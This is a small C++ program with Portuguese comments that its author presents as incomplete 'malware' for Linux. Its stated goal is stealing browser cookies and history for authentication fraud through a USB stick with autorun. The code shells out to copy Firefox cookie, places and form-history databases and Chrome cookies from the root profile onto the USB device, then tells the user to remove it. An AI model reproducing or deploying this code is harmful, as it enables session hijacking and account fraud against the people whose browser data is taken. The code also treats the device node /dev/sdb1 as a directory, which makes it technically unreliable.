// O malware ainda n esta completo ... 
//SIMPLES "MALWARE" EM C++ .
//ALVO SO LINUX
//OBJETIVO:ROUBAR OS COOKIES E HISTORY DO NAVEGADOR
//PARA FRAUDE DE AUTENTICAÇÃO.
//So coloquei o mozilla e chrome pois são os navegadores mais usados atualmente.
//METODO: PENDRIVER + AUTORUN & MALWARE
// /dev/sdb1 é o diretorio do pendrive
//Autor:Nando
//Data:09/01/2017

#include <iostream> //declara a bibliote iostream
#include <stdlib.h> //declara a variavel stdlib.h ela serve para usar os comando do system.
using namespace std;

int main(){
	system("mkdir /dev/sdb1/Mozilla"); // cria uma pasta para onde os arquivos serao copiados
	system("cp /root/.mozilla/firefox/zq4l46ym.default/cookies.sqlite /dev/sdb1/Mozilla"); // copia os cookies do navegador mozilla para o pendrive em /dev/sdb1
	system("cp /root/.mozilla/firefox/zq4l46ym.default/places.sqlite /dev/sdb1/Mozilla");
	system("cp /root/.mozilla/firefox/zq4l46ym.default/cookies.sqlite-shm /dev/sdb1/Mozilla");
	system("cp /root/.mozilla/firefox/zq4l46ym.default/cookies.sqlite-wal /dev/sdb1/Mozilla");
	system("cp /root/.mozilla/firefox/zq4l46ym.default/formhistory.sqlite /dev/sdb1/Mozilla");
//
	system("mkdir /dev/sdb1/Google-Chrome"); // cria uma pasta para onde os arquivos copiados serao copiados
	system("cp /root/.config/google-chrome/Default/Cookies /dev/sdb1/Google-Chrome"); // copia tds os arquivo do google-chrome para o pendriver.
        cout << "REMOVA O PENDRIVER !!!" << endl; // amostra na tela do usuario para remover o pendriver .
  
}
